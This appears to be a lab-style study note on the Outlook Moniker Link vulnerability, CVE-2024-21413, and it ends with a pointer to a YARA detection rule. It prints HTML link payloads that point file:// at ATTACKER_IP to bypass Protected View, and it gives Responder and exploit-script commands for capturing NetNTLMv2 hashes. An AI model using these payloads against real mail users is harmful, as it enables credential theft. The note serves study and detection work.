# Moniker Link

### Basics

**Moniker Link** - critical Microsoft Outlook vulnerability known as **CVE-2024-21413**. The vulnerability abuses **Moniker Links** in HTML emails to bypass Outlook's **Protected View**.  

Normal link:
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```

Adding `!` bypasses the protection (read-only protected view):
```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```

### Credential Leak

After clicking the malicious link:

1. Outlook attempts to access the attacker's machine.
2. **SMB** authentication is triggered.
3. Victim's **NetNTLMv2 hash** is sent to the attacker.
4. The hash can be captured with **Responder**.

> The remote file/share does not need to exist for the authentication attempt to happen.

### Exploitation

1. Hacker listens for SMB authentication:
```bash
responder -I ens5
```
2. Attacker runs the script ([GitHub](https://github.com/CMNatic/CVE-2024-21413))
```bash
python3 exploit.py
```
3. After clicking link hacker gets netNTMLv2 hash

### Detecting

A [Yara rule(opens in new tab)](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) has been created by Florian Roth) to detect emails containing the `file:\\` element in the Moniker Link.
